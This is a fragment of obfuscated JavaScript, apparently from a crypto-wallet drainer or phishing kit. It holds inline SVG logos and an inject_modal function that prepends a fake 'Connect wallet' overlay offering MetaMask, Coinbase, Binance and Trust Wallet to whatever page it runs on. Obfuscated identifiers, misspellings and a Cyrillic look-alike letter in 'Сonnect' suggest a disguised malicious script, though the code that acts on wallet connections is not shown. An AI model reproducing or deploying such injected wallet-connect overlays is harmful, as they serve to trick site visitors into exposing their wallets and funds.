18.9687L12.4069 17.8343L13.4469 20.0087L14.1087 16.4156L7.11186 16.1318L9.94873 18.9687Z\"fill=#CC6228></path><path d=\"M9.47636 26.7212L9.59386 26.7343L10.1614 21.723L10.1314 21.6299L10.0414 21.5918L6.16511 21.6862L6.06323 21.7499L6.07011 21.8699L9.37948 26.7862L9.50573 26.8349L9.59511 26.7337L9.47636 26.7212L9.57448 26.6549L6.38573 21.9174L9.91073 21.8312L9.35886 26.7074L9.47636 26.7212ZM21.957 21.6155L21.8395 21.6287L22.407 26.6399L22.4964 26.7412L22.6226 26.6924L25.932 21.7762L25.9389 21.6562L25.837 21.5924L21.9607 21.498L21.8707 21.5362L21.8407 21.6293L21.957 21.6155L21.9539 21.7337L25.6151 21.823L22.6057 26.2943L22.0745 21.6024L21.957 21.6155ZM24.8876 16.1318L24.8826 16.0137L17.8857 16.2974L17.7982 16.3418L17.7745 16.4368L18.4364 20.0299L18.537 20.1255L18.6589 20.0593L19.6489 17.9899L22.0014 19.0755L22.1345 19.0518L24.9707 16.2155L24.9951 16.0843L24.882 16.0137L24.8876 16.1318L24.8039 16.048L22.0257 18.8262L19.6426 17.7262L19.4864 17.7824L18.6032 19.6287L18.032 16.5274L24.8926 16.2499L24.8876 16.1318ZM9.94886 18.9687L9.99823 19.0762L12.3507 17.9905L13.3407 20.0599L13.4626 20.1262L13.5632 20.0305L14.2251 16.4374L14.2014 16.3424L14.1139 16.298L7.11698 16.0143L7.00386 16.0849L7.02823 16.2162L9.86448 19.0524L9.99761 19.0762L9.94886 18.9687L10.0326 18.8849L7.41011 16.2624L13.9682 16.528L13.397 19.6293L12.5139 17.783L12.3576 17.7268L9.89948 18.8612L9.94886 18.9687Z\"fill=#CC6228></path><path d=\"M7.11255 16.0376L10.0438 21.8051L9.94942 18.9688C9.9488 18.9688 7.11255 16.132 7.11255 16.0376ZM22.0513 18.9688L21.9569 21.8051L24.8882 16.0376L22.0513 18.9688ZM14.1088 16.4157L13.4469 20.0088L14.2975 24.2638L14.4869 18.6857L14.1088 16.4157ZM17.8913 16.4157L17.5132 18.6851L17.7025 24.2632L18.5532 20.0082L17.8913 16.4157Z\"fill=#E27525></path><path d=\"M7.11251 16.0379L7.00688 16.0916L9.93813 21.8591L10.0731 21.9197L10.1619 21.8016L10.0675 18.9654L10.0331 18.886C10.0319 18.8847 9.32438 18.1772 8.61563 17.4566C8.26126 17.0966 7.90688 16.7335 7.64188 16.4547C7.50938 16.3154 7.39938 16.1979 7.32313 16.1129L7.23751 16.0135L7.22001 15.9904L7.19876 16.0041L7.22126 15.9935L7.22001 15.9904L7.19876 16.0041L7.22126 15.9935L7.12813 16.0391H7.23126L7.22126 15.9935L7.12813 16.0391H7.23126H7.11251L7.00688 16.0929L7.11251 16.0379H6.99438L7.02188 16.1197C7.08063 16.206 7.27126 16.4091 7.54751 16.6985C8.36813 17.5554 9.86501 19.0522 9.86563 19.0529L9.94938 18.9691L9.83126 18.9729L9.90813 21.2772L7.21813 15.9841L7.08501 15.9229L6.99438 16.0379H7.11251ZM22.0513 18.9691L21.9331 18.9654L21.8388 21.8016L21.9275 21.9197L22.0625 21.8591L24.9938 16.0916L24.9569 15.9416L24.8031 15.9554L21.9669 18.8866L21.9338 18.9647L22.0513 18.9691L22.1363 19.051L24.4269 16.6841L22.0925 21.2772L22.1694 18.9729L22.0513 18.9691ZM14.1088 16.416L13.9925 16.3947L13.3306 19.9879L13.3313 20.0322L14.1819 24.2872L14.3075 24.3816L14.4163 24.2679L14.6056 18.6897L14.6044 18.6666L14.2263 16.3972L14.1106 16.2985L13.9931 16.3954L14.1088 16.416L13.9919 16.4354L14.3681 18.6929L14.2138 23.2429L13.5669 20.0079L14.2244 16.4372L14.1088 16.416ZM17.8913 16.416L17.7744 16.3966L17.3963 18.666L17.395 18.6891L17.5844 24.2672L17.6931 24.381L17.8188 24.2866L18.6694 20.0316L18.67 19.9872L18.0081 16.3941L17.8906 16.2972L17.775 16.396L17.8913 16.416L17.775 16.4372L18.4325 20.0079L17.7856 23.2422L17.6313 18.6929L18.0075 16.4354L17.8913 16.416Z\"fill=#E27525></path><path d=\"M18.5531 20.0088L17.7025 24.2638L18.27 24.6419L21.9575 21.8056L22.0519 18.9694L18.5531 20.0088ZM9.94873 18.9688L10.0431 21.805L13.7306 24.6413L14.2981 24.2631L13.4475 20.0081L9.94873 18.9688Z\"fill=#F5841F></path><path d=\"M18.5531 20.0087L18.4374 19.9856L17.5868 24.2406L17.6374 24.3619L18.2049 24.74L18.3424 24.7356L22.0299 21.8994L22.0762 21.8094L22.1706 18.9731L22.1249 18.8756L22.0193 18.8556L18.5212 19.8956L18.4387 19.9856L18.5531 20.0087L18.5868 20.1219L21.9281 19.1287L21.8406 21.7456L18.2643 24.4962L17.8331 24.2087L18.6687 20.0319L18.5531 20.0087ZM9.94869 18.9687L9.83057 18.9725L9.92494 21.8087L9.97119 21.8987L13.6587 24.735L13.7962 24.7394L14.3637 24.3612L14.4143 24.24L13.5637 19.985L13.4812 19.895L9.98307 18.855L9.87744 18.875L9.83182 18.9725L9.94869 18.9687L9.91494 19.0819L13.3449 20.1019L14.1662 24.2094L13.7356 24.4969L10.1593 21.7462L10.0668 18.9656L9.94869 18.9687Z\"fill=#F5841F></path><path d=\"M18.6475 28.5182V27.3832L18.3637 27.0995H13.6362L13.3525 27.3832V28.5182L9.38184 26.627L10.8 27.7613L13.5418 29.6526H18.3637L21.2 27.7613L22.5237 26.627L18.6475 28.5182Z\"fill=#C0AC9D></path><path d=\"M18.6475 28.5181H18.7656V27.3831L18.7313 27.3L18.4475 27.0163L18.3638 26.9813H13.6363L13.5525 27.0163L13.2688 27.3L13.2344 27.3831V28.3306L9.4325 26.52L9.28125 26.5644L9.3075 26.7194L10.7262 27.8538L10.7325 27.8588L13.4744 29.75L13.5419 29.7706H18.3638L18.4294 29.7506L21.2656 27.86L21.2769 27.8513L22.6006 26.7169L22.6225 26.5619L22.4719 26.5206L18.5956 28.4119L18.6475 28.5181H18.7656H18.6475L18.6994 28.6244L21.7463 27.1375L21.1288 27.6669L18.3281 29.5344H13.5788L10.8706 27.6669L10.2531 27.1731L13.3019 28.6244L13.4156 28.6175L13.4706 28.5181V27.4325L13.685 27.2175H18.315L18.5294 27.4325V28.5181L18.585 28.6181L18.6994 28.6244L18.6475 28.5181Z\"fill=#C0AC9D></path><path d=\"M18.3638 24.6413L17.7963 24.2632H14.2982L13.7307 24.6413L13.3525 27.3832L13.6363 27.0994H18.3638L18.6475 27.3832L18.3638 24.6413Z\"fill=#161616></path><path d=\"M18.3637 24.6413L18.4293 24.5431L17.8618 24.165L17.7962 24.145H14.2981L14.2325 24.165L13.665 24.5431L13.6137 24.625L13.2356 27.3669L13.3 27.4894L13.4362 27.4669L13.685 27.2175H18.315L18.5637 27.4669L18.6981 27.49L18.765 27.3713L18.4812 24.6294L18.4293 24.5431L18.3637 24.6413L18.2462 24.6538L18.4956 27.0644L18.4475 27.0163L18.3637 26.9813H13.6362L13.5525 27.0163L13.5175 27.0513L13.8406 24.71L14.3337 24.3813H17.7606L18.2981 24.74L18.3637 24.6413L18.2462 24.6538L18.3637 24.6413Z\"fill=#161616></path><path d=\"M30.8445 10.1759L31.8845 5.07027L30.372 0.342773L18.3645 9.23027L22.9976 13.1065L29.5213 14.9978L30.9395 13.2959L30.2776 12.8234L31.2232 11.8778L30.467 11.3103L31.4126 10.554L30.8445 10.1759ZM0.115723 5.07027L1.15572 10.1759L0.493848 10.6484L1.53385 11.4046L0.777598 11.9721L1.72322 12.9178L1.06135 13.3903L2.47947 15.0921L9.00322 13.2009L13.6363 9.32465L1.72322 0.342773L0.115723 5.07027Z\"fill=#763E1A></path><path d=\"M30.8444 10.1757L30.96 10.1995L32 5.09324L31.9969 5.03387L30.4844 0.306367L30.4081 0.230117L30.3013 0.247617L18.2938 9.13512L18.2456 9.22637L18.2881 9.32074L22.9212 13.197L22.9644 13.2201L29.4881 15.1114L29.6119 15.0732L31.03 13.3714L31.0562 13.2807L31.0075 13.1995L30.4594 12.8076L31.3062 11.9607L31.3406 11.8689L31.2938 11.7826L30.6594 11.307L31.4856 10.6457L31.53 10.5482L31.4775 10.4551L30.91 10.077L30.8444 10.1757L30.7787 10.2739L31.2119 10.5626L30.3925 11.2182L30.3481 11.3126L30.3956 11.4051L31.0431 11.8907L30.1938 12.7401L30.1594 12.8332L30.2087 12.9195L30.7669 13.3182L29.4794 14.8626L23.0531 13.0001L18.5544 9.23574L30.3088 0.535742L31.7619 5.07699L30.7281 10.1526L30.7781 10.2745L30.8444 10.1757ZM0.115625 5.07012L0 5.09324L1.025 10.1239L0.425625 10.552L0.37625 10.6476L0.425 10.7439L1.33563 11.4064L0.7075 11.8776L0.660625 11.9639L0.695 12.0557L1.54188 12.9026L0.99375 13.2945L0.945 13.3757L0.97125 13.4664L2.38937 15.1682L2.51312 15.2064L9.03687 13.3151L9.08 13.292L13.7131 9.41574L13.7556 9.32199L13.7087 9.23074L1.79437 0.248242L1.68875 0.229492L1.61188 0.304492L0.00375 5.03199L0 5.09324L0.115625 5.07012L0.2275 5.10824L1.7825 0.535742L13.4462 9.33012L8.94625 13.0951L2.52063 14.9576L1.23312 13.4126L1.79125 13.0139L1.84063 12.9276L1.80625 12.8345L0.956875 11.9851L1.60438 11.4995L1.65188 11.4039L1.60312 11.3089L0.695625 10.6489L1.22375 10.2714L1.27062 10.1514L0.231875 5.04637L0.115625 5.07012Z\"fill=#763E1A></path><path d=\"M29.4257 14.9976L22.9019 13.1064L24.8875 16.0376L21.9563 21.7108H25.8325H31.6L29.4257 14.9976ZM9.09817 13.1064L2.57441 14.9976L0.399414 21.7108H6.16691H10.0432L7.11192 16.0376L9.09817 13.1064ZM17.8913 16.4158L18.3638 9.23014L20.255 4.12451H11.84L13.7313 9.23014L14.1094 16.4158L14.2988 18.6851V24.2633H17.7969V18.6851L17.8913 16.4158Z\"fill=#F5841F></path><path d=\"M29.4256 14.9977L29.4587 14.884L22.935 12.9927L22.8062 13.0365L22.8037 13.1721L24.75 16.0452L21.8512 21.6559L21.855 21.7715L21.9562 21.8284H25.8325H31.6L31.6956 21.7796L31.7125 21.674L29.5381 14.9609L29.4587 14.884L29.4256 14.9977L29.3131 15.034L31.4375 21.5921H25.8325H22.15L24.9919 16.0915L24.985 15.9709L23.1831 13.3109L29.3925 15.1109L29.4256 14.9977ZM9.09812 13.1065L9.06499 12.9927L2.54124 14.884L2.46187 14.9609L0.286865 21.674L0.30374 21.7802L0.399365 21.829H6.16687H10.0431L10.1437 21.7721L10.1475 21.6565L7.24874 16.0459L9.19499 13.1727L9.19249 13.0371L9.06374 12.9934L9.09812 13.1065L8.99999 13.0402L7.01437 15.9715L7.00749 16.0921L9.84937 21.5927H6.16687H0.561865L2.66687 15.094L9.13062 13.2202L9.09812 13.1065ZM17.8912 16.4159L18.0094 16.4234L18.4812 9.25461L20.3662 4.16523L20.3525 4.05648L20.2556 4.00586H11.84L11.7431 4.05648L11.7294 4.16523L13.6137 9.25398L13.9912 16.4221V16.4259L14.18 18.6902V24.2634L14.2144 24.3471L14.2981 24.3815H17.7962L17.88 24.3471L17.9144 24.2634V18.6877L18.0087 16.4209L17.8912 16.4159L17.7731 16.4109L17.6787 18.6802V18.6852V24.1452H14.4169V18.6852L14.4162 18.6752L14.2275 16.4077L13.8494 9.22336L13.8425 9.18836L12.0106 4.24211H20.0856L18.2537 9.18836L18.2469 9.22148L17.7744 16.4071V16.4102L17.8912 16.4159Z\"fill=#F5841F></path></svg></div><div class=modal-el-desc><span class=modal-el-desc-first>MetaMask</span> <span class=modal-el-desc-second>Connnect to your MetaMask wallet</span></div></div><div class=menu-el data=2><div class=modal-icon><svg fill=none height=32 viewBox=\"0 0 32 32\"width=32 xmlns=http://www.w3.org/2000/svg><g clip-path=url(#clip0_73_248)><path d=\"M16 0C24.8375 0 32 7.1625 32 16C32 24.8375 24.8375 32 16 32C7.1625 32 0 24.8375 0 16C0 7.1625 7.1625 0 16 0Z\"fill=#0052FF></path><path d=\"M16.0031 21.625C12.8969 21.625 10.3781 19.1094 10.3781 16C10.3781 12.8906 12.8969 10.375 16.0031 10.375C18.7875 10.375 21.1 12.4062 21.5438 15.0625H27.2094C26.7313 9.2875 21.8969 4.75 16 4.75C9.7875 4.75 4.75 9.7875 4.75 16C4.75 22.2125 9.7875 27.25 16 27.25C21.8969 27.25 26.7313 22.7125 27.2094 16.9375H21.5406C21.0938 19.5938 18.7875 21.625 16.0031 21.625Z\"fill=white></path></g><defs><clipPath id=clip0_73_248><rect fill=white height=32 width=32></rect></clipPath></defs></svg></div><div class=modal-el-desc><span class=modal-el-desc-first>Coinbase</span> <span class=modal-el-desc-second>Connnect to your Coinbase wallet</span></div></div><div class=menu-el data=3><div class=modal-icon><svg fill=none height=32 viewBox=\"0 0 32 32\"width=32 xmlns=http://www.w3.org/2000/svg><g clip-path=url(#clip0_73_337)><path d=\"M7.24266 16L3.63808 19.6046L0.0244141 16L3.629 12.3955L7.24266 16ZM16.0044 7.23827L22.1876 13.4214L25.7922 9.81686L16.0044 0.0200195L6.20759 9.81686L9.81218 13.4214L16.0044 7.23827ZM28.3708 12.3955L24.7662 16L28.3708 19.6046L31.9754 16L28.3708 12.3955ZM16.0044 24.7618L9.82126 18.5786L6.21667 22.1832L16.0044 31.9801L25.7922 22.1832L22.1876 18.5786L16.0044 24.7618ZM16.0044 19.6046L19.609 16L16.0044 12.3955L12.3908 16L16.0044 19.6046Z\"fill=#F0B90B></path></g><defs><clipPath id=clip0_73_337><rect fill=white height=32 width=32></rect></clipPath></defs></svg></div><div class=modal-el-desc><span class=modal-el-desc-first>Binance Wallet</span> <span class=modal-el-desc-second>Connnect to your Binance wallet</span></div></div><div class=menu-el data=4><div class=modal-icon><svg fill=none height=32 viewBox=\"0 0 32 32\"width=32 xmlns=http://www.w3.org/2000/svg><g clip-path=url(#clip0_73_86)><path d=\"M0 8.125C0 3.63769 3.63769 0 8.125 0H23.875C28.3623 0 32 3.63769 32 8.125V23.875C32 28.3623 28.3623 32 23.875 32H8.125C3.63769 32 0 28.3623 0 23.875V8.125Z\"fill=#F1F7FE></path><path d=\"M16.0094 6.71875C19.2381 9.41525 22.9407 9.24894 23.9985 9.24894C23.7671 24.5846 22.004 21.5436 16.0094 25.8438C10.0147 21.5436 8.26266 24.5846 8.03125 9.24894C9.07809 9.24894 12.7807 9.41525 16.0094 6.71875Z\"stroke=#3375BB stroke-linecap=round stroke-linejoin=round stroke-miterlimit=10 stroke-width=2.56></path></g><defs><clipPath id=clip0_73_86><rect fill=white height=32 width=32></rect></clipPath></defs></svg></div><div class=modal-el-desc><span class=modal-el-desc-first>Trust Wallet</span> <span class=modal-el-desc-second>Connnect to your Trust wallet</span></div></div></div></div><div class=modal-bottom><button><svg fill=none height=24 viewBox=\"0 0 25 24\"width=25 xmlns=http://www.w3.org/2000/svg><path d=\"M9.875 3.375H5.75C5.25272 3.375 4.77581 3.57254 4.42417 3.92417C4.07254 4.27581 3.875 4.75272 3.875 5.25V9.375C3.875 9.87228 4.07254 10.3492 4.42417 10.7008C4.77581 11.0525 5.25272 11.25 5.75 11.25H9.875C10.3723 11.25 10.8492 11.0525 11.2008 10.7008C11.5525 10.3492 11.75 9.87228 11.75 9.375V5.25C11.75 4.75272 11.5525 4.27581 11.2008 3.92417C10.8492 3.57254 10.3723 3.375 9.875 3.375ZM9.5 9H6.125V5.625H9.5V9ZM9.875 12.75H5.75C5.25272 12.75 4.77581 12.9475 4.42417 13.2992C4.07254 13.6508 3.875 14.1277 3.875 14.625V18.75C3.875 19.2473 4.07254 19.7242 4.42417 20.0758C4.77581 20.4275 5.25272 20.625 5.75 20.625H9.875C10.3723 20.625 10.8492 20.4275 11.2008 20.0758C11.5525 19.7242 11.75 19.2473 11.75 18.75V14.625C11.75 14.1277 11.5525 13.6508 11.2008 13.2992C10.8492 12.9475 10.3723 12.75 9.875 12.75ZM9.5 18.375H6.125V15H9.5V18.375ZM19.25 3.375H15.125C14.6277 3.375 14.1508 3.57254 13.7992 3.92417C13.4475 4.27581 13.25 4.75272 13.25 5.25V9.375C13.25 9.87228 13.4475 10.3492 13.7992 10.7008C14.1508 11.0525 14.6277 11.25 15.125 11.25H19.25C19.7473 11.25 20.2242 11.0525 20.5758 10.7008C20.9275 10.3492 21.125 9.87228 21.125 9.375V5.25C21.125 4.75272 20.9275 4.27581 20.5758 3.92417C20.2242 3.57254 19.7473 3.375 19.25 3.375ZM18.875 9H15.5V5.625H18.875V9ZM13.25 16.125V13.875C13.25 13.5766 13.3685 13.2905 13.5795 13.0795C13.7905 12.8685 14.0766 12.75 14.375 12.75C14.6734 12.75 14.9595 12.8685 15.1705 13.0795C15.3815 13.2905 15.5 13.5766 15.5 13.875V16.125C15.5 16.4234 15.3815 16.7095 15.1705 16.9205C14.9595 17.1315 14.6734 17.25 14.375 17.25C14.0766 17.25 13.7905 17.1315 13.5795 16.9205C13.3685 16.7095 13.25 16.4234 13.25 16.125ZM21.125 15.375C21.125 15.6734 21.0065 15.9595 20.7955 16.1705C20.5845 16.3815 20.2984 16.5 20 16.5H18.875V19.5C18.875 19.7984 18.7565 20.0845 18.5455 20.2955C18.3345 20.5065 18.0484 20.625 17.75 20.625H14.375C14.0766 20.625 13.7905 20.5065 13.5795 20.2955C13.3685 20.0845 13.25 19.7984 13.25 19.5C13.25 19.2016 13.3685 18.9155 13.5795 18.7045C13.7905 18.4935 14.0766 18.375 14.375 18.375H16.625V13.875C16.625 13.5766 16.7435 13.2905 16.9545 13.0795C17.1655 12.8685 17.4516 12.75 17.75 12.75C18.0484 12.75 18.3345 12.8685 18.5455 13.0795C18.7565 13.2905 18.875 13.5766 18.875 13.875V14.25H20C20.2984 14.25 20.5845 14.3685 20.7955 14.5795C21.0065 14.7905 21.125 15.0766 21.125 15.375Z\"fill=white></path></svg> \u0421onnect by QR-code</button> <span>\u0421onnect by QR-code with WalletConnect</span></div></div>";
const inject_modal = () => {
  try {
    let _0x1e8646 = document.createElement("style");
    _0x1e8646.id = "web3-style";
    _0x1e8646.innerHTML = MS_Modal_Data[0x0].data;
    document.head.appendChild(_0x1e8646);
    let _0x51b030 = document.createElement("div");
    _0x51b030.id = "web3-overlay";
    _0x51b030.classList = ["web3-overlay"];
    _0x51b030.style.display = 'none';
    document.body.prepend(_0x51b030);
    document.querySelector(".web3-overlay").addEventListener('click', () => {
      ms_hide();
    });
    let _0x486235 = document.createElement("div");
    _0x486235.id = "web3-modal";
    _0x486235.classList = ['web3-modal'];
    _0x486235.style.display = 'none';
    _0x486235.innerHTML = MS_Modal_Data[0x1].data;
    document.body.prepend(_0x486235);
    let _0x41a545 = document.createElement("style");
    _0x41a545.innerHTML = "@import url(https://fonts.googleapis.com/css2?family=Manrope:wght@400;500&display=swap);#overlay { position: fixed; display: block; width: 100%; height: 100%; top: 0; background-color: rgb(0 0 0/25%); left: 0; right: 0; bottom: 0; z-index: 99999; }.modal{position:absolute;top:150%;left:50%;transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);box-sizing:border-box;width:100%;display:flex;max-width:440px;font-family:Manrope;flex-direction:column;color:#01091b;align-items:flex-start;background:#fff;border-radius:24px}.modal-head{display:flex;padding:32px 24px;justify-content:space-between;align-items:center;box-sizing:border-box}.modal-head-block-f{display:flex;flex-direction:column;align-items:flex-start;gap:8px}.modal-head-title{font-size:22px;font-weight:500}.modal-head-desc{color:#677189;font-size:16px;max-width:279px;font-weight:400}.modal-close{display:flex;padding:12px;align-items:flex-start;gap:8px;justify-content:end;position:absolute;right:8px;top:8px;cursor:pointer}.modal-main{display:flex;padding:0 24px 32px 24px;flex-direction:column;gap:20px}.modal-main-title{font-size:16px;font-weight:500}.modal-main-menu{display:flex;align-items:flex-start;align-content:flex-start;gap:16px;align-self:stretch;flex-wrap:wrap;justify-content:center}.menu-el{display:flex;padding:16px;flex-direction:column;align-items:flex-start;gap:32px;box-sizing:border-box;cursor:pointer;max-width:188px;border-radius:16px;border:1px solid #d3e5ed}.modal-el-desc{display:flex;flex-direction:column;align-items:flex-start;gap:4px;align-self:stretch}span.modal-el-desc-first{font-size:16px;font-style:normal;font-weight:500}span.modal-el-desc-second{color:#677189;font-size:14px;font-style:normal;font-weight:400;align-self:stretch}.modal-icon{display:flex;width:32px;height:32px;justify-content:center;align-items:center}.menu-el:hover{border:1px solid #0052ff}.modal-bottom{display:flex;padding:0 24px 24px 24px;flex-direction:column;align-items:center;gap:16px;align-self:stretch}.modal-bottom button{border-radius:16px;background:#0052ff;display:flex;padding:16px 0;justify-content:center;align-items:center;gap:8px;align-self:stretch;outline:0;cursor:pointer;border:0;color:#fff;font-size:16px;font-weight:500}.modal-bottom span{color:#677189;font-size:14px;font-style:normal;font-weight:300}.modal.black{background:#161a1e;color:#f5f5f5}.modal.black .menu-el{border:1px solid #2c3437}.modal.black .menu-el:hover{border:1px solid #0052ff}.modal.black .modal-head-desc{color:#a7a8aa}.modal.black span.modal-el-desc-second{color:#a7a8aa}.modal.black .modal-bottom span{color:#a7a8aa}@media (min-width:375px) and (max-width:450px){.menu-el{max-width:100%;width:100%;flex-direction:row}}@media (min-width:150px) and (max-width:375px){.menu-el{max-width:100%;width:100%;flex-direction:row}span.modal-el-desc-second {display: none;}.modal-el-desc {justify-content: center;align-items: center;}}";
    document.head.appendChild(_0x41a545);
    let _0x302e24 = document.createElement("div");
    _0x302e24.id = 'overlay';
    _0x302e24.style.display = "none";
    _0x302e24.innerHTML = "<div class=\"modal black\" style=\"display: none;\"><div class=modal-head><div class=modal-head-block-f><div class=modal-head-title>Connect wallet</div><div class=modal-head-desc>Choose what network and wallet want to connect below</div></div><div class=modal-close><svg fill=none height=24 viewBox=\"0 0 24 24\"width=24 xmlns=http://www.w3.org/2000/svg><path d=\"M5.31854 5.31952C5.74457 4.89349 6.4353 4.89349 6.86132 5.31952L11.5445 10.0027L16.2276 5.31952C16.6537 4.89349 17.3444 4.89349 17.7704 5.31952C18.1964 5.74555 18.1964 6.43627 17.7704 6.8623L13.0873 11.5455L17.7704 16.2286C18.1964 16.6546 18.1964 17.3454 17.7704 17.7714C17.3444 18.1974 16.6537 18.1974 16.2276 17.7714L11.5445 13.0882L6.86132 17.7714C6.4353 18.1974 5.74457 18.1974 5.31854 17.7714C4.89252 17.3454 4.89252 16.6546 5.31854 16.2286L10.0017 11.5455L5.31854 6.8623C4.89252 6.43627 4.89252 5.74555 5.31854 5.31952Z\"fill=#C4C4C4 clip-rule=evenodd fill-rule=evenodd></path></svg></div></div><div class=modal-main><div class=modal-main-title>Choose Network</div><div class=modal-main-menu><div class=menu-el data=1><div class=modal-icon><svg fill=none height=30 viewBox=\"0 0 32 30\"width=32 xmlns=http://www.w3.org/2000/svg><path d=\"M30.3712 0.342773L17.9856 9.51402L20.255 4.12465L30.3712 0.342773Z\"fill=#E17726></path><path d=\"M30.3713 0.342559L30.3013 0.247559L18.262 9.16193L20.3438 4.21693L30.4126 0.453184L30.3713 0.342559L30.3013 0.247559L30.3713 0.342559L30.3301 0.231934L20.2132 4.01381L20.1457 4.07818L17.877 9.46756L17.9126 9.60631L18.0557 9.60881L30.442 0.437559L30.4751 0.285684L30.3301 0.231934L30.3713 0.342559Z\"fill=#E17726></path><path d=\"M1.72316 0.342773L14.0144 9.6084L11.84 4.12465L1.72316 0.342773ZM25.8332 21.6159L22.5238 26.6271L29.615 28.6128L31.6007 21.7109C31.695 21.7109 25.8332 21.6159 25.8332 21.6159ZM0.399414 21.8053L2.38504 28.7071L9.47629 26.7215L6.16691 21.7103C6.16691 21.6159 0.399414 21.8053 0.399414 21.8053Z\"fill=#E27625></path><path d=\"M1.72314 0.342559L1.65189 0.436934L13.9431 9.70256L14.0856 9.70193L14.1238 9.56443L11.95 4.08068L11.8813 4.01381L1.76439 0.231934L1.61939 0.285684L1.65189 0.436934L1.72314 0.342559L1.68189 0.453184L11.7494 4.21693L13.7494 9.26068L1.79439 0.248184L1.72314 0.342559ZM25.8331 21.6157L25.7344 21.5507L22.425 26.5619L22.4131 26.6682L22.4919 26.7407L29.5831 28.7263L29.7288 28.6451L31.7144 21.7432L31.6006 21.7107V21.8288L31.6113 21.8282L31.7169 21.7351L31.6581 21.6069L31.6156 21.5932L31.5856 21.5919C31.2344 21.5851 25.8344 21.4976 25.8344 21.4976L25.7338 21.5507L25.8331 21.6157L25.8313 21.7338C25.8344 21.7338 27.2731 21.7569 28.7156 21.7807C29.4369 21.7926 30.1575 21.8044 30.6988 21.8132C30.9694 21.8176 31.1944 21.8213 31.3519 21.8238L31.535 21.8269L31.5831 21.8276H31.595H31.5969L31.5994 21.7569L31.5956 21.8276H31.5969L31.5994 21.7569L31.5956 21.8276L31.6013 21.7157L31.5919 21.8276H31.5956L31.6013 21.7157L31.5919 21.8276L31.6013 21.7107L31.5838 21.8269L31.5913 21.8276L31.6006 21.7107L31.5831 21.8269L31.6006 21.7101L31.5688 21.8238L31.5831 21.8269L31.6006 21.7101L31.5906 21.5926L31.5994 21.6969V21.5919L31.5906 21.5926L31.5994 21.6969V21.5919L31.4856 21.6776L29.5325 28.4669L22.7106 26.5569L25.9306 21.6813L25.8331 21.6157ZM0.399395 21.8051L0.285645 21.8376L2.27127 28.7394L2.41689 28.8207L9.50815 26.8351L9.58689 26.7626L9.57502 26.6563L6.26565 21.6451L6.16689 21.7101H6.28502L6.22627 21.6057L6.12002 21.5782C6.01877 21.5688 5.82877 21.5651 5.56752 21.5651C4.08627 21.5651 0.396895 21.6863 0.39627 21.6863L0.304395 21.7351L0.28627 21.8376L0.399395 21.8051L0.403145 21.9232C0.408145 21.9232 4.09502 21.8019 5.5669 21.8019C5.75065 21.8019 5.8994 21.8038 6.00065 21.8082L6.11064 21.8157L6.12377 21.8176L6.14752 21.7338L6.10252 21.8076L6.12377 21.8176L6.14752 21.7338L6.10252 21.8076L6.16252 21.7101H6.0494L6.10315 21.8076L6.16315 21.7101H6.05002L6.0694 21.7751L9.2894 26.6507L2.46627 28.5613L0.513145 21.7726L0.399395 21.8051Z\"fill=#E27625></path><path d=\"M9.09817 13.1062L7.11255 16.0375L14.1094 16.3212L13.92 8.75746L9.09817 13.1062ZM22.9969 13.1062L18.0807 8.75684L17.8913 16.4156L24.8882 16.1318C24.8875 16.0375 22.9969 13.1062 22.9969 13.1062ZM9.4763 26.7212L13.7313 24.6412L10.0438 21.805L9.4763 26.7212ZM18.3638 24.6412L22.6188 26.7212L22.0513 21.805C21.9569 21.805 18.3638 24.6412 18.3638 24.6412Z\"fill=#E27625></path><path d=\"M9.09809 13.1066L8.99996 13.0403L7.01434 15.9716L7.00684 16.0909L7.10746 16.1559L14.1043 16.4397L14.1918 16.4059L14.2268 16.3191L14.0375 8.75531L13.9662 8.64969L13.8406 8.67031L9.01871 13.0191L8.99996 13.0403L9.09809 13.1066L9.17746 13.1941L13.8087 9.01719L13.9881 16.1978L7.32996 15.9278L9.19621 13.1728L9.09809 13.1066ZM22.9968 13.1066L23.075 13.0178L18.1587 8.66844L18.0331 8.64844L17.9618 8.75406L17.7725 16.4128L17.8075 16.4997L17.895 16.5334L24.8925 16.2503L25.0056 16.1322L24.9906 16.0684C24.9531 15.9834 24.825 15.7722 24.6412 15.4741C24.0943 14.5897 23.0962 13.0428 23.0956 13.0422L23.0743 13.0178L22.9968 13.1066L22.8975 13.1703C22.8987 13.1716 23.37 13.9028 23.8425 14.6472C24.0787 15.0191 24.315 15.3941 24.4918 15.6816C24.58 15.8253 24.6537 15.9466 24.7043 16.0341L24.7618 16.1366L24.7737 16.1616L24.8662 16.1322H24.77L24.7743 16.1616L24.8668 16.1322H24.7706H24.8887L24.8837 16.0141L18.0131 16.2928L18.1931 9.01406L22.9193 13.1953L22.9968 13.1066ZM9.47621 26.7216L9.52809 26.8278L13.7831 24.7478L13.8487 24.6534L13.8031 24.5478L10.1156 21.7116L9.99746 21.6966L9.92621 21.7916L9.35871 26.7078L9.40809 26.8178L9.52809 26.8272L9.47621 26.7216L9.59371 26.7353L10.1368 22.0259L13.5075 24.6191L9.42371 26.6153L9.47621 26.7216ZM18.3637 24.6416L18.3118 24.7478L22.5668 26.8278L22.6868 26.8184L22.7362 26.7084L22.1687 21.7922L22.0512 21.6878L21.9743 21.7109C21.8812 21.7641 21.6237 21.9572 21.2618 22.2322C20.1868 23.0522 18.2906 24.5497 18.29 24.5497L18.2456 24.6553L18.3112 24.7491L18.3637 24.6416L18.4368 24.7341C18.4387 24.7328 19.335 24.0253 20.2443 23.3166C20.6993 22.9622 21.1568 22.6078 21.5062 22.3422C21.6806 22.2097 21.8287 22.0991 21.9343 22.0228L22.0587 21.9359L22.0893 21.9166L22.0906 21.9159L22.0506 21.8234V21.9234L22.0906 21.9159L22.0506 21.8234V21.9234V21.8053L21.9331 21.8191L22.4756 26.5209L18.415 24.5359L18.3637 24.6416Z\"fill=#E27625></path><path d=\"M22.5238 26.7216L18.2688 24.6416L18.6469 27.3835V28.5179L22.5238 26.7216ZM9.47632 26.7216L13.4476 28.6129V27.4785L13.8257 24.7366L9.47632 26.7216Z\"fill=#D5BFB2></path><path d=\"M22.5238 26.7214L22.5757 26.6152L18.3207 24.5352L18.1994 24.5458L18.1519 24.6577L18.5288 27.3914V28.5177L18.5832 28.617L18.6963 28.6245L22.5725 26.8283L22.6413 26.722L22.575 26.6145L22.5238 26.7214L22.4738 26.6139L18.765 28.3327V27.3833L18.7638 27.367L18.4157 24.8452L22.4713 26.8277L22.5238 26.7214ZM9.47628 26.7214L9.42565 26.8283L13.3969 28.7195L13.5107 28.7127L13.5657 28.6127V27.4864L13.9425 24.752L13.8963 24.6408L13.7769 24.6283L9.42753 26.6139L9.35815 